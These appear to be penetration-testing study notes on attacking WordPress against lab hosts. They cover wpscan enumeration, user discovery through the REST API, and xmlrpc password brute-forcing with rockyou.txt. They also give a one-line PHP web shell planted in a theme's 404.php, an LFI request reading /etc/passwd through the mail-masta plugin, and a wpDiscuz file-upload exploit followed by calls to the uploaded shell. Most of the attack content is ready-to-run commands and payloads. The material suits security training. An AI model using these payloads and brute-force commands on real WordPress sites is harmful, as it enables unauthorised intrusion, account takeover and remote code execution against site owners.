### Footprinting + Enumeration
```bash
wpscan --url $url 
wpscan --url $url -e vp     <- Vulnerable plugins
wpscan --url $url -e cb     <- Config backups
wpscan --url $url -e p --plugins-detection aggressive
curl -s http://metapress.htb/ | grep plugins
```

```bash
curl -s http://blog.inlanefreight.local | grep WordPress
```

```bash
curl http://inlanefreight.local/robots.txt

User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://blog.inlanefreight.local/wp-sitemap.xml
```
##### Themes + Plugins
WordPress stores its plugins in the `wp-content/plugins` directory. This folder is helpful to enumerate vulnerable plugins. Themes are stored in the `wp-content/themes` directory. These files should be carefully enumerated as they may lead to RCE.

```bash
curl -s http://blog.inlanefreight.local/ | grep themes
curl -s http://metapress.htb/ | grep plugins
```
Visiting `/wp-content/plugins/realplugin` can uncover `readme`'s with the version

##### User enumeration
We can discover users by attempting to login via `/wp-admin` and the error messages they produce. [Good resource](https://gosecure.ai/blog/2021/03/16/6-ways-to-enumerate-wordpress-users/)
```bash
curl http://blog.inlanefreight.local/?rest_route=/wp/v2/users
```

### Exploitation
#### **Login bruteforcing**
Two methods, `xmlrpc`(faster api) and the wp-login.
```bash
wpscan --password-attack xmlrpc -t 20 -U john -P ~/rockyou.txt --url http://blog.inlanefreight.local
```

#### RCE
This is possible with Administrative access to the admin panel. This can be done by adding a single line of PHP code within an unused theme then calling upon it.
This should be on an uncommon page like `404.php`
```php
system($_GET[0]);
```

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```
This can also be done with Metasploit (`rhost` and `vhost`must be set)
```bash
use exploit/unix/webapp/wp_admin_shell_upload 
```

#### Vulnerable Plugins
##### mail-masta
This plugin suffers from two vulnerabilities [unauthenticated SQL injection](https://www.exploit-db.com/exploits/41438) and a [Local File Inclusion](https://www.exploit-db.com/exploits/50226).
```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
##### wpDiscuz
Based on the version number (7.0.4), this [exploit](https://www.exploit-db.com/exploits/49967) has a pretty good shot of getting us command execution. The crux of the vulnerability is a file upload bypass. 
```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1

curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

